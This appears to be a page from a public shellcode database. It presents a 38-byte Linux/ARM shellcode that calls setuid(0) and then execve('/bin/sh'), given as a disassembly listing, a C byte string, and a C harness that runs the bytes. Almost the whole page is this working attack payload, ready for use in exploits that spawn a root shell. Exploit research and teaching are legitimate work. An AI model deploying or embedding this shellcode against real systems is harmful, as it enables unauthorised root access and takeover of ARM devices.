<html><head><title>Linux/ARM - setuid(0) &amp; execve(/bin/sh, /bin/sh, 0) - 38 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title:  Linux/ARM - setuid(0) &amp; execve(&quot;/bin/sh&quot;,&quot;/bin/sh&quot;,0) - 38 bytes
Date:   2010-06-29
Tested: ARM926EJ-S rev 5 (v5l)

Author: Jonathan Salwan
Web:    http://shell-storm.org | http://twitter.com/jonathansalwan

! Database of shellcodes http://www.shell-storm.org/shellcode/


    8054:	e28f3001 	add	r3, pc, #1	; 0x1
    8058:	e12fff13 	bx	r3
    805c:	1b24      	subs	r4, r4, r4
    805e:	1c20      	adds	r0, r4, #0
    8060:	2717      	movs	r7, #23
    8062:	df01      	svc	1
    8064:	4678      	mov	r0, pc
    8066:	300a      	adds	r0, #10
    8068:	9001      	str	r0, [sp, #4]
    806a:	a901      	add	r1, sp, #4
    806c:	1a92      	subs	r2, r2, r2
    806e:	270b      	movs	r7, #11
    8070:	df01      	svc	1
    8072:	2f2f      	cmp	r7, #47
    8074:	6962      	ldr	r2, [r4, #20]
    8076:	2f6e      	cmp	r7, #110
    8078:	6873      	ldr	r3, [r6, #4]
*/

#include &lt;stdio.h&gt;

char *SC = &quot;\x01\x30\x8f\xe2&quot;
           &quot;\x13\xff\x2f\xe1&quot;
           &quot;\x24\x1b\x20\x1c&quot;
           &quot;\x17\x27\x01\xdf&quot;
           &quot;\x78\x46\x0a\x30&quot;
           &quot;\x01\x90\x01\xa9&quot;
           &quot;\x92\x1a\x0b\x27&quot;
           &quot;\x01\xdf\x2f\x2f&quot;
           &quot;\x62\x69\x6e\x2f&quot;
           &quot;\x73\x68&quot;;


int main(void)
{
        fprintf(stdout,&quot;Length: %d\n&quot;,strlen(SC));
        (*(void(*)()) SC)();
return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
